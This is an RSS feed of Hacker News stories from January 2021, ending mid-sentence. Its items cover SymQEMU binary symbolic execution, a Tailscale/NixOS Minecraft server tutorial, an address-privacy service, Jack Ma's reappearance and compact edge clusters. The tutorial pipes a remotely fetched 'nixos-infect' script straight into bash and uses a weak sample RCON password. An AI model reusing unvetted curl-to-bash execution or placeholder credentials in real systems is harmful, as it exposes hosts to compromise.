<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 22 Jan 2021 13:11:11 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 22 Jan 2021 13:11:11 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[SymQEMU: Compilation-based symbolic execution for binaries]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25844386">thread link</a>) | @Rochus
<br/>
January 20, 2021 | http://www.s3.eurecom.fr/tools/symbolic_execution/symqemu.html | <a href="https://web.archive.org/web/*/http://www.s3.eurecom.fr/tools/symbolic_execution/symqemu.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <blockquote>
    <p>
      SymQEMU: Compilation-based symbolic execution for binaries
    </p>
    
    <em>Proceedings of the Network and Distributed System Symposium (NDSS 2021),
    San Diego, CA, USA</em>
    
    
    <p>
      Symbolic execution is a powerful technique for software analysis and bug
      detection. Compilation-based symbolic execution is a recently proposed
      flavor that has been shown to improve the performance of symbolic
      execution significantly when source code is available. We demonstrate a
      novel technique to enable compilation-based symbolic execution of binaries
      (i.e., without the need for source code). Our system, SymQEMU, builds on
      top of QEMU, modifying the intermediate representation of the target
      program before translating it to the host architecture. This enables
      SymQEMU to compile symbolic-execution capabilities into binaries and reap
      the associated performance benefits while maintaining architecture
      independence.
    </p>
    
    <p>
      We present our approach and implementation, and we show that it
      outperforms the state-of-the-art binary symbolic executors S2E and QSYM
      with statistical significance; on some benchmarks, it even achieves better
      performance than the source-based SymCC. Moreover, our tool has found a
      previously unknown vulnerability in the well-tested libarchive library,
      demonstrating its utility in testing real-world software.
    </p>
  </blockquote>

  <h2 id="intro">Introduction</h2>

  <p>
    SymQEMU is a fast symbolic execution engine for binaries. On this page, we
    provide its source code, the raw results of the experiments described in the
    paper, and instructions how you can replicate those experiments yourself.
  </p>

  <h2>Code</h2>

  <p>
    SymQEMU is available
    on <a href="https://github.com/eurecom-s3/symqemu">GitHub</a>.
  </p>

  <h2>Experiments</h2>

  <p>
    In the paper, we describe three sets of experiments: we first benchmark
    SymQEMU with Google FuzzBench, then we run it on real-world software, and
    finally we perform a benchmark comparison during concolic execution of fixed
    paths. This section describes how to replicate our experiments, and provides
    links to our results.
  </p>

  <ol>
    <li>
      <p>
        FuzzBench (see the <a href="http://s3.eurecom.fr/~seba/2020-05-24-symqemu.zip">report</a>)
      </p>

      <p>
        We will share our integration scripts shortly; they're being cleaned up
        to obtain SymQEMU and its dependencies from the new public repository.
      </p>
    </li>

    <li>
      <p>Real-world software</p>

      <p>
        For the analysis of real-world software we used the same setup as in the
        <a href="http://www.s3.eurecom.fr/tools/symbolic_execution/symcc.html">evaluation of SymCC</a>. The binaries for SymQEMU,
        QSYM and S2E were plain builds without any instrumentation. SymQEMU was
        run via SymCC's fuzzing helper by prefixing the target command
        with <tt>/path/to/symqemu-x86_64</tt>. For the S2E analysis, we created
        a default project, then enabled the <tt>FunctionModels</tt> plugin and
        activated the option <tt>generateOnStateFork</tt> in
        the <tt>TestCaseGenerator</tt> plugin; coverage was evaluated
        with <tt>afl-showmap</tt> at the end of the analysis, using the same
        AFL-instrumented binaries as with the hybrid fuzzers.
      </p>

      <ul>
          <li>
            OpenJPEG
            (<a href="http://www.s3.eurecom.fr/~seba/symqemu_afl_openjpeg.tar.gz">our
            results</a>), libarchive
            (<a href="http://www.s3.eurecom.fr/~seba/symqemu_afl_libarchive.tar.gz">our
            results</a>), tcpdump
            (<a href="http://www.s3.eurecom.fr/~seba/symqemu_afl_tcpdump.tar.gz">our
            results</a>): please find the details on
            our <a href="http://www.s3.eurecom.fr/tools/symbolic_execution/symcc.html">SymCC page</a>.
          </li>

          <li>
            <a href="https://www.rarlab.com/download.htm">WinRAR</a>
            (<a href="http://www.s3.eurecom.fr/~seba/symqemu_afl_rar.tar.gz">our
            results</a>): we downloaded version 6.00 for 64-bit Linux.
          </li>
        </ul>
      
    </li>

    <li>
      <p>
        Benchmark experiments
          (<a href="http://www.s3.eurecom.fr/~seba/symqemu_benchmark.tar.gz">our
          results</a>)
      </p>

      <p>
        After the analysis of real-world software described above, we randomly
        collected 1,000 generated test cases per open-source target. We ran
        SymQEMU, QSYM and SymCC on each of those inputs, recording the time
        spent in execution and SMT solving, respectively, as per the logging
        output from the QSYM backend.
      </p>
    </li>
  </ol>

  <h2>Acknowledgements</h2>

  <p>
    This work has been supported partly by the DAPCODS/IOTics ANR 2016 project
    (ANR-16-CE25-0015) and partly by the Defense Advanced Research
    Projects Agency (DARPA) under agreement number FA875019C0003.
  </p>

  <h2>Contact</h2>

  <p>
    Feel free to <a href="http://www.s3.eurecom.fr/~seba/">reach out</a> to us
    if anything is unclear or if you need more information.
  </p>
</div></div>]]>
            </description>
            <link>http://www.s3.eurecom.fr/tools/symbolic_execution/symqemu.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25844386</guid>
            <pubDate>Wed, 20 Jan 2021 09:32:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tailscale on NixOS: A New Minecraft Server in Ten Minutes]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25843609">thread link</a>) | @tutfbhuf
<br/>
January 19, 2021 | https://tailscale.com/blog/nixos-minecraft/ | <a href="https://web.archive.org/web/*/https://tailscale.com/blog/nixos-minecraft/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>NixOS is a Linux distribution built from the ground up to make it easy to deploy
services. Tailscale is a peer-to-peer VPN built to make it easy to connect
machines. In this article I will show how to set up a Java Edition
Minecraft server (exposed only over Tailscale) in ten minutes on Digital Ocean.</p>
<p>Before you begin this guide, you’ll need the following:</p>
<ul>
<li>A <a href="https://www.digitalocean.com/">Digital Ocean</a> account</li>
<li>A <a href="https://www.minecraft.net/en-us/">Minecraft</a> Java Edition account</li>
</ul>
<p>You’ll also need <a href="https://tailscale.com/start">a Tailscale account</a>. You can
make a free solo account using an <code>@gmail.com</code> address.</p>
<p>In NixOS one of the core principles is that the entire system is configurable
with a modular language called Nix. This allows you to configure everything
using a common syntax so you don’t need to remember every configuration file
format for every service you use. As such, you can configure an entire system
from a single file.</p>
<p>Let’s make a new configuration file called <code>host.nix</code> and set up a system that
has Tailscale start up on boot:</p>
<div><pre><code data-lang="nix"><span>{</span> <span>config</span><span>,</span> <span>pkgs</span><span>,</span> <span>...</span> <span>}:</span>

<span>{</span>
  <span># make the tailscale command usable to users</span>
  <span>environment</span><span>.</span><span>systemPackages</span> <span>=</span> <span>[</span> <span>pkgs</span><span>.</span><span>tailscale</span> <span>];</span>

  <span># enable the tailscale service</span>
  <span>services</span><span>.</span><span>tailscale</span><span>.</span><span>enable</span> <span>=</span> <span>true</span><span>;</span>
<span>}</span>
</code></pre></div><p>This will have Tailscale start up, however to authenticate to Tailscale we need
to take a few more steps. First, head to the <a href="https://login.tailscale.com/admin/authkeys">Pre-Auth Keys page in the admin
panel</a>.</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/preauth-key.png" alt="The key creation screen from the Tailscale adminUI"></p>
<p>Create a new one-time use key and then copy it to your notes. We will use it
below.</p>
<p>With this key we can write a <a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files#the-service-section">systemd oneshot
unit</a>
that will log in to Tailscale using this key.</p>
<p>A systemd oneshot job is something that systemd expects to be run once as
opposed to being a persistent service. The above Digital Ocean link explains
this in more detail.</p>
<p>Copy this configuration below the <code>services.tailscale.enable</code> line in your
<code>host.nix</code> file:</p>
<div><pre><code data-lang="nix">  <span># ...</span>

  <span># create a oneshot job to authenticate to Tailscale</span>
  <span>systemd</span><span>.</span><span>services</span><span>.</span><span>tailscale-autoconnect</span> <span>=</span> <span>{</span>
    <span>description</span> <span>=</span> <span>"Automatic connection to Tailscale"</span><span>;</span>

    <span># make sure tailscale is running before trying to connect to tailscale</span>
    <span>after</span> <span>=</span> <span>[</span> <span>"network-pre.target"</span> <span>"tailscale.service"</span> <span>];</span>
    <span>wants</span> <span>=</span> <span>[</span> <span>"network-pre.target"</span> <span>"tailscale.service"</span> <span>];</span>
    <span>wantedBy</span> <span>=</span> <span>[</span> <span>"multi-user.target"</span> <span>];</span>

    <span># set this service as a oneshot job</span>
    <span>serviceConfig</span><span>.</span><span>Type</span> <span>=</span> <span>"oneshot"</span><span>;</span>

    <span># have the job run this shell script</span>
    <span>script</span> <span>=</span> <span>with</span> <span>pkgs</span><span>;</span> <span>''
</span><span>      # wait for tailscaled to settle
</span><span>      sleep 2
</span><span>
</span><span>      # check if we are already authenticated to tailscale
</span><span>      status="$(</span><span>${</span><span>tailscale</span><span>}</span><span>/bin/tailscale status -json | </span><span>${</span><span>jq</span><span>}</span><span>/bin/jq -r .BackendState)"
</span><span>      if [ $status = "Running" ]; then # if so, then do nothing
</span><span>        exit 0
</span><span>      fi
</span><span>
</span><span>      # otherwise authenticate with tailscale
</span><span>      </span><span>${</span><span>tailscale</span><span>}</span><span>/bin/tailscale up -authkey tskey-examplekeyhere
</span><span>    ''</span><span>;</span>
  <span>};</span>
</code></pre></div><p>Make sure to replace <code>tskey-examplekeyhere</code> with the key you got from the Admin
panel. Without this key your VPS cannot connect to Tailscale.</p>
<p>Now that we have Tailscale configured to authenticate and connect to your
network, let’s enable the lightweight NixOS firewall so that we can only allow
Minecraft traffic over Tailscale. The <a href="https://nixos.org/manual/nixos/stable/index.html#sec-firewall">NixOS
manual</a> has more
details, but at a high level we need to:</p>
<ul>
<li>Enable the firewall</li>
<li>Mark tailscale0 as a trusted interface</li>
<li>Allow anyone on the internet to connect to Tailscale’s UDP port (don’t worry,
they will be rejected if they are not a part of your network)</li>
<li>Allow anyone on the internet to connect to your server’s SSH port (this will
also work over Tailscale, but having it exposed over the public internet can
help when debugging issues that happen before tailscale starts)</li>
</ul>
<p>We can do that with the following configuration added to the end of your
<code>host.nix</code> file:</p>
<div><pre><code data-lang="nix">  <span># ...</span>
  <span>networking</span><span>.</span><span>firewall</span> <span>=</span> <span>{</span>
    <span># enable the firewall</span>
    <span>enable</span> <span>=</span> <span>true</span><span>;</span>

    <span># always allow traffic from your Tailscale network</span>
    <span>trustedInterfaces</span> <span>=</span> <span>[</span> <span>"tailscale0"</span> <span>];</span>

    <span># allow the Tailscale UDP port through the firewall</span>
    <span>allowedUDPPorts</span> <span>=</span> <span>[</span> <span>config</span><span>.</span><span>services</span><span>.</span><span>tailscale</span><span>.</span><span>port</span> <span>];</span>

    <span># allow you to SSH in over the public internet</span>
    <span>allowedTCPPorts</span> <span>=</span> <span>[</span> <span>22</span> <span>];</span>
  <span>};</span>
</code></pre></div><p>Now we can configure the Minecraft server. The <a href="https://search.nixos.org/options?channel=20.09&amp;show=services.minecraft-server.dataDir&amp;from=0&amp;size=30&amp;sort=relevance&amp;query=services.minecraft-server">Minecraft
options</a>
expose a number of settings you can use to configure your server however you
want. Please note that you <em>must</em> set the EULA agreement to <code>true</code> yourself. The
Minecraft server is a closed-source program, so you must give NixOS permission
to use closed source packages.</p>
<div><pre><code data-lang="nix">  <span># ...</span>
  <span>services</span><span>.</span><span>minecraft-server</span> <span>=</span> <span>{</span>
    <span>enable</span> <span>=</span> <span>true</span><span>;</span>
    <span>eula</span> <span>=</span> <span>false</span><span>;</span> <span># set to true if you agree to Mojang's EULA: https://account.mojang.com/documents/minecraft_eula</span>
    <span>declarative</span> <span>=</span> <span>true</span><span>;</span>

    <span># see here for more info: https://minecraft.gamepedia.com/Server.properties#server.properties</span>
    <span>serverProperties</span> <span>=</span> <span>{</span>
      <span>server-port</span> <span>=</span> <span>25565</span><span>;</span>
      <span>gamemode</span> <span>=</span> <span>"survival"</span><span>;</span>
      <span>motd</span> <span>=</span> <span>"NixOS Minecraft server on Tailscale!"</span><span>;</span>
      <span>max-players</span> <span>=</span> <span>5</span><span>;</span>
      <span>enable-rcon</span> <span>=</span> <span>true</span><span>;</span>
      <span># This password can be used to administer your minecraft server.</span>
      <span># Exact details as to how will be explained later. If you want</span>
      <span># you can replace this with another password.</span>
      <span>"rcon.password"</span> <span>=</span> <span>"hunter2"</span><span>;</span>
      <span>level-seed</span> <span>=</span> <span>"10292992"</span><span>;</span>
    <span>};</span>
  <span>};</span>

  <span># enable closed source packages such as the minecraft server</span>
  <span>nixpkgs</span><span>.</span><span>config</span><span>.</span><span>allowUnfree</span> <span>=</span> <span>true</span><span>;</span>
</code></pre></div><p>Now we have everything we need. We set up Tailscale, we configured an automatic
login to Tailscale, we set up the firewall so that it rejects all incoming
traffic (except for traffic from you Tailscale network) and finally we
configured the Minecraft server so that your can play in survival mode.</p>
<p>Now let’s get this put into a new Digital Ocean server. Open a new text editor
window and create a file called <code>user-data.yaml</code>. Copy this template into it:</p>
<div><pre><code data-lang="yaml"><span>#cloud-config</span><span>
</span><span></span><span>write_files</span><span>:</span><span>
</span><span>  </span>- <span>path</span><span>:</span><span> </span>/etc/nixos/host.nix<span>
</span><span>    </span><span>permissions</span><span>:</span><span> </span><span>"0644"</span><span>
</span><span>    </span><span>content</span><span>:</span><span> </span><span>|
</span><span>      { pkgs, config, ... }:</span><span>
</span><span>
</span><span>      </span>{<span>
</span><span>
</span><span>      </span>}<span>
</span><span>
</span><span></span><span>runcmd</span><span>:</span><span>
</span><span>  </span>- curl<span> </span>https<span>:</span>//raw.githubusercontent.com/elitak/nixos-infect/master/nixos-infect<span> </span>|<span> </span>PROVIDER=digitalocean<span> </span>NIXOS_IMPORT=./host.nix<span> </span>NIX_CHANNEL=nixos<span>-20.09</span><span> </span>bash<span> </span><span>2</span>&gt;<span>&amp;1</span><span> </span>|<span> </span>tee<span> </span>/tmp/infect.log<span>
</span></code></pre></div><p>At the time of this article being written, Digital Ocean doesn’t have a NixOS
image by default. So we will use
<a href="https://github.com/elitak/nixos-infect">nixos-infect</a> in order
to automatically replace an Ubuntu installation with a NixOS one. We are also
going to use it to automatically configure the server with the <code>host.nix</code> file
we just made.</p>
<p>Copy the contents of <code>host.nix</code> into the <code>content</code> value of the <code>write_files</code>
block. Be sure to indent the file by four spaces so that it will work as yaml
user data. When you are done you should have a file that looks something like
<a href="https://gist.github.com/Xe/b2f26ae62e7ff6f6030e4a94ed3e2707">this reference file</a>.</p>
<p>Now that you have the cloud config, let’s launch the server in the cloud.</p>
<p>Open the Digital Ocean control panel and click Create and then click Droplets.
Choose an Ubuntu 20.04 image and a plan with at least 4 GB of ram (the Minecraft
server needs a lot of resources, unfortunately).</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/droplet-tier.png" alt="The droplet config using Ubuntu 20.04 and a droplet with 4 GB ofram"></p>
<p>Then choose a datacenter near you and enable the IPv6 and User Data options.
Paste the contents of your <code>user-data.yaml</code> file into the text box that shows
up. Choose your SSH key in the list of SSH keys that shows up and then give the
droplet a hostname, such as “minecraft”. If you want you can enable backups.</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/user-data.png" alt="The droplet user data pasted into the user datafield"></p>
<p>Once you have everything set up, click the large green button labeled Create
Droplet. It may take up to 10 minutes to install and configure NixOS, however
you will be able to see the machine in your Tailscale network once everything is
done setting up. Go grab a cup of your favorite caffeinated beverage.</p>
<p>After it shows up in your network list, you can fire up your Minecraft
client and connect to your new server. You may need to select a slightly older
version of Minecraft if the in-game UI tells you to use an older version of
Minecraft. You can adjust the Minecraft version you are running using
<a href="https://help.minecraft.net/hc/en-us/articles/360034754852-Changing-game-versions-">the launcher UI</a>.</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/host-info.png" alt="The host information in the Tailscale controlpanel"></p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/server-connect.png" alt="The minecraft server connectionUI"></p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/minecraft-world.png" alt="An in-game screenshot of the author’s Minecraft avatar in a forestbiome"></p>
<p>If you want to administer your minecraft server, you can add the <code>mcrcon</code>
package to your system config next to the <code>tailscale</code> package:</p>
<div><pre><code data-lang="nix">  <span>environment</span><span>.</span><span>systemPackages</span> <span>=</span> <span>with</span> <span>pkgs</span><span>;</span> <span>[</span> <span>tailscale</span> <span>mcrcon</span> <span>];</span>
</code></pre></div><p>Then you can connect to the Minecraft server command line with this command:</p>
<pre><code data-lang="console">$ mcrcon -p hunter2
</code></pre><p>If you adjusted the rcon password above, you will need to adjust this command to
include that new password. From there you can change gamemodes, adjust the time
of day and anything else you want.</p>
<p>Once <a href="https://tailscale.com/kb/1084/sharing">node sharing</a> is generally
available, you can use it to invite people you trust to your server. (Node
sharing is still in private beta.) Generate an invite link in the admin panel
and they can use that to join your adventure.</p>
<p>If you want to make configuration changes to your server after you provision it,
edit the <code>/etc/nixos/host.nix</code> file in your favorite text editor (such as nano).
The <a href="https://nixos.org/manual/nixos/stable/index.html#ch-configuration">NixOS
manual</a>
should help guide you if you want to install more services (such as backups
using <a href="https://christine.website/blog/borg-backup-2021-01-09">borgbackup</a> or
anything else listed in the <a href="https://search.nixos.org/options">options</a>). The
cloud’s the limit!</p>

    </div></div>]]>
            </description>
            <link>https://tailscale.com/blog/nixos-minecraft/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25843609</guid>
            <pubDate>Wed, 20 Jan 2021 07:38:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop leaking your legal address; create custom addresses]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25843002">thread link</a>) | @sudcha
<br/>
January 19, 2021 | https://blog.pointaddress.com/private-address/ | <a href="https://web.archive.org/web/*/https://blog.pointaddress.com/private-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>                
			<p>The world is becoming more and more aware of privacy and concerns around it. We are trying to limit sharing our personal information online, but how often are we protecting one of our most private information: <strong>our legal address</strong>?</p>

<h3 id="your-address-is-private">Your address is Private</h3>
<p>Think about it, how often do you share your legal address in the world?</p>

<p>From online shopping, to delivery like food, grocery or selling second hand goods in marketplace… how many entities did you share your address with in the last one year? My bad, one year is too long. How about last one month?</p>

<blockquote>
  <p>Your address information is personally identifiable information (Private Information), and shouldn’t be accessible by entities who don’t really need it.</p>
</blockquote>

<center>
<img src="https://blog.pointaddress.com/assets/images/private-address/private-property.jpg">
<em>Your legal address is Private information.</em>
</center>


<p>From group chats, to online portals; from free signups to lucky draws; from resumes to job applications; from facebook marketplace to craigslist we keep sharing our address with strangers on untrusted platforms.</p>

<p>We consistently hear news about data leaks from poorly coded applications that exposed your address to malicious actors. Many online applications sell your legal address information to third parties for profit, or worse knowingly for the purpose of spam, phishing or hijacking your identity online or in the real world.</p>

<p>Despite this, we never we ask ourselves, why are we sharing the most private information with everyone?</p>

<p>Well, the reason is simple: there hasn’t been a platform until now which allowed users to <strong>“create addresses”</strong>. This is a new concept that most of us never thought of, but subconsciously have always wished it existed.</p>

<blockquote>
  <p>The concept of “creating a personal address” is something most of us have never thought of, but subconsciously wished it existed.</p>
</blockquote>


<p>Point addresses are not legal addresses. They are mapping to a Point in the world named by you. You can create as many Point Addresses as you may want instantly.</p>

<p>You can call the location where you want deliveries as <strong>·happy-home-us·</strong> or <strong>·delivery2me-us·</strong> or anything else of your choice, and Point it precisely to the location in the real world with description and photos if you wish to add.</p>

<center>
<img src="https://blog.pointaddress.com/assets/images/private-address/deliver2me.jpg">
<em><b><a href="https://pnt.is/delivery2me-us" target="_blank">·delivery2me-us·</a></b> Point Address I just created</em>
</center>


<p>When you create a Point Address, you have complete control over it. From updating the Point itself such as changing its name, updating Point’s location, to its visibility (Public or Private), you have full control over your Point Address.</p>

<h3 id="private-protected-and-public-points">Private, Protected and Public Points</h3>
<p>With Point, you can mark your addresses one of the three options:</p>

<ul>
  <li><strong>Private</strong>: The Point Address is only available to you, and nobody else.</li>
  <li><strong>Protected</strong>: Only those people who know the Point Address, either via link, or by name can search for it in Point Search.</li>
  <li><strong>Public</strong>: Points that are Public show on Explore and can be found by anyone looking for Points in that area. Good example of the Public points are to allow Business and Service Providers to share their location with people looking for the services.</li>
</ul>

<center>
<img src="https://blog.pointaddress.com/assets/images/private-address/statuses.png" width="80%"><br>
<em>Different Statuses for your Point Address.</em>
</center>


<h3 id="point-is-available-everywhere">Point is available everywhere</h3>
<p>It doesn’t matter if you’re in US, Japan or India. You can use Point Address anywhere, anytime for anyone.</p>

<p>It is our endeavor to democratize addresses, and give the control of their location to the users themselves.</p>

<h3 id="httpspointaddresscom"><a href="https://pointaddress.com/">https://pointaddress.com</a></h3>
                
			</article></div>]]>
            </description>
            <link>https://blog.pointaddress.com/private-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25843002</guid>
            <pubDate>Wed, 20 Jan 2021 05:56:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jack Ma Emerges for First Time Since Crackdown on Ant, Alibaba]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25842960">thread link</a>) | @dsr12
<br/>
January 19, 2021 | https://www.bnnbloomberg.ca/jack-ma-emerges-for-first-time-since-crackdown-on-ant-alibaba-1.1550984 | <a href="https://web.archive.org/web/*/https://www.bnnbloomberg.ca/jack-ma-emerges-for-first-time-since-crackdown-on-ant-alibaba-1.1550984">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Jack Ma resurfaced for the first time since Chinaâ€™s government began clamping down on his business empire nearly three months ago, appearing in a live-streamed video that sent Alibaba Group Holding Ltd.â€™s stock soaring but left plenty of unanswered questions about the billionaireâ€™s fate.</p>

<p>Ma spoke briefly on Wednesday during an annual event he hosts to recognize rural teachers. In one video of the event circulated online, Chinaâ€™s most famous entrepreneur can be seen touring a primary school in his hometown of Hangzhou. Ma, who had stayed out of public view since regulators suspended the initial public offering of his fintech company Ant Group Co., told the teachers heâ€™ll spend more time on philanthropy. He didnâ€™t mention his run-ins with Beijing.</p>

<p>Ant confirmed the authenticity of the video, first posted on an online blog, but declined to comment further. Shares of Alibaba, the e-commerce giant co-founded by Ma that owns about a third of Ant, jumped 8.5 per cent in Hong Kong and were up almost the same level in pre-market U.S. trade.</p>

<p>Speculation about Maâ€™s whereabouts and his standing with President Xi Jinpingâ€™s government had reached a fever pitch in recent weeks, after regulators ordered Ant to overhaul its business and began an antitrust investigation of Alibaba. Beijingâ€™s crackdown followed an October speech by Ma in which he infamously rebuked â€œpawn shopâ€� Chinese lenders, regulators who donâ€™t get the internet, and the â€œold menâ€� of the global banking community.</p>

<p>Maâ€™s comments on Wednesday struck a much different tone, echoing themes espoused by the ruling Communist Party. A former English schoolteacher, he spoke about the importance of reviving Chinaâ€™s countryside and narrowing income disparities by encouraging the return of younger talent to rural areas.</p>

<p>â€œRecently, my colleagues and I have been studying and thinking. We made a firmer resolution to devote ourselves to education philanthropy,â€� Ma said during the event. â€œWorking hard for rural revitalization and common prosperity is the responsibility for our generation of businessmen.â€�</p>

<p>While Maâ€™s exact whereabouts remain unclear, his emergence in a public forum may help quell some of the more dire rumors about his fate in a country where media coverage is often tightly choreographed. Among the earliest outlets to report on his video address was an online news outlet backed by the Zhejiang provincial government.</p>

<p>Ma had kept out of public view since regulators in November scuttled Antâ€™s US$35 billion IPO, tightened fintech regulations and launched a separate probe into Alibaba -- all in a span of weeks.</p>

<p>â€œJack Maâ€™s unexpected re-emergence -- just as sudden as his earlier disappearance -- is likely a sign that his relationship with Beijingâ€™s regulatory authorities has stabilized,â€� said Brock Silvers, a managing director at private equity fund Kaiyuan Capital in Hong Kong.</p>

<p>But Ma probably isnâ€™t out of the woods, Silvers added. â€œA path acceptable to all parties may have been identified, but Ant Group still looks likely to be dis-aggregated and regulatory restrictions will almost surely take a significant bite out of Antâ€™s former valuation.â€�</p>

<p>Jack Ma addressing teachers via livestream at an annual event Ma hosts to recognize rural educators, Jan. 20.</p>

<p>The clampdown on Maâ€™s empire is part of a broader campaign to rein in a generation of Chinese tech giants that Beijing views as wielding too much control over the worldâ€™s second-largest economy.</p>

<p>The government has increasingly sought to exert influence over the extent to which companies from Tencent Holdings Ltd. to ByteDance Ltd. amass data and direct commerce and media. The same month Antâ€™s IPO was scuttled, the nationâ€™s top antitrust watchdog published new guidelines warning tech giants against monopolistic practices from forced exclusive arrangements to collusion on data. While Ant and Alibaba have borne the brunt of that assault since November, investors have since sold off peers from Tencent to Meituan. Both stocks rallied more than 3 per cent on Wednesday.</p>

<p>While Alibabaâ€™s surge added about US$58 billion to the companyâ€™s market value, Maâ€™s standing with Beijing remains unclear. As of early December, the man most closely identified with the meteoric rise of China Inc. was advised by the government to stay in the country, a person familiar with the matter has said. Debate about his whereabouts arose because Beijing has in the past quietly detained billionaires that have run afoul of the law, without immediate trial.</p>

<p><strong>What Bloomberg Intelligence Says</strong></p>

<p>Jack Maâ€™s live-streamed appearance with rural teachers after keeping out of public view for more than two months may boost market sentiment on Alibaba and alleviate worst-case investor concerns. However, the monopoly probe launched in December by Chinaâ€™s State Administration for Market Regulation is yet to be resolved and may continue to weigh on the companyâ€™s future acquisitions and broader business practices.</p>

<p><em>- Vey-Sern Ling and Tiffany Tam, analysts</em></p>
</div></div>]]>
            </description>
            <link>https://www.bnnbloomberg.ca/jack-ma-emerges-for-first-time-since-crackdown-on-ant-alibaba-1.1550984</link>
            <guid isPermaLink="false">hacker-news-small-sites-25842960</guid>
            <pubDate>Wed, 20 Jan 2021 05:50:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A simple browser based video editor (desktop only)]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25842714">thread link</a>) | @bwasti
<br/>
January 19, 2021 | https://bwasti.github.io/mebm/ | <a href="https://web.archive.org/web/*/https://bwasti.github.io/mebm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bwasti.github.io/mebm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25842714</guid>
            <pubDate>Wed, 20 Jan 2021 04:56:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Are compact clusters the future of edge computing?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25842295">thread link</a>) | @hexman
<br/>
January 19, 2021 | https://turingpi.com/are-compact-clusters-the-future-of-edge-computing/ | <a href="https://web.archive.org/web/*/https://turingpi.com/are-compact-clusters-the-future-of-edge-computing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>There are many discussions around edge computing and its adoption scenarios. One of the key ingredients that could accelerate edge transformation is the ability to use an existing software stack for continuous deployment to the edge. We believe that a new type of hardware that can organically coexist with the cloud ecosystem could be a solution to address the challenge. For example, Turing Pi designed to be an edge computer with cloud-native hardware architecture.&nbsp;</p><p>The idea of processing data closer to the source isn’t new. Though, the opportunities that Kubernetes as well as machine learning open to it sound more promising than ever.&nbsp;</p><h4><em>It is doubtful that edge computing is going to replace the cloud. More likely, the edge is going to be an extension. That’s why the synergy of these two paradigms is empirical.&nbsp;</em></h4><p>Cloud computing has spawned many cloud-native solutions. Technologies like containers, serverless, Kubernetes changed the way developers build, deliver, and scale software. What all these technologies have in common is that they designed for distributed computing. The idea behind Turing Pi is a cluster of computers interconnected with Ethernet but all in one compact device. This architecture allows deploying and scaling software to the edge in the same way as in the cloud.&nbsp;</p><h4><em>The concept of a cluster board is similar to a PC motherboard but with an Ethernet network instead of a PCI bus. Rather than using just one processor, the cluster board can combine multiple processors and multiple types of processors. As an example, general-purpose compute modules can work in combination with machine learning modules. This heterogeneous approach could open a wider adaptation of machine learning applications at the edge.&nbsp;</em></h4><p>In other words, Turing Pi is a compact, energy-efficient, out of the box RACK system. These characteristics allow placing clusters in various locations, hard to reach places, and build things like mobile data centers. <a href="https://medium.com/@cfatechblog/edge-computing-at-chick-fil-a-7d67242675e2" target="_blank" rel="noreferrer noopener nofollow">A striking example of cluster computing</a> adoption is the Chick-Fil-A restaurant chain. The company placed local Kubernetes clusters in more than two thousand restaurants. That helped Chick-Fil-A to build a resilient, highly available, internet-independent system. As a result, the company automated critical business processes and reduced public cloud load by processing data locally. The possibility of using cloud-native technologies at the edge helped Chick-Fil-A to accelerate innovations and get the code running in production as fast as possible.&nbsp;</p><p>Turing Pi V1 model is mostly aimed at developers, Devops and researchers. It is an amazing platform for learning and experimentation. The cluster board currently supports Raspberry Pi compute modules, which are intended for industrial applications. Raspberry Pi, by far, is the most popular single-board computer, and its colossal software ecosystem should help to lower entry points for new developers.&nbsp;Bare metal cluster using Raspberry Pis and running on Linux is not only affordable compared to what it can do, but can also be a great tool when dealing with resource-intensive tasks like compiling, continuous data parsing, or learning how to manage a cluster using real hardware instead of virtual machines. Also, it is very useful to have a personal 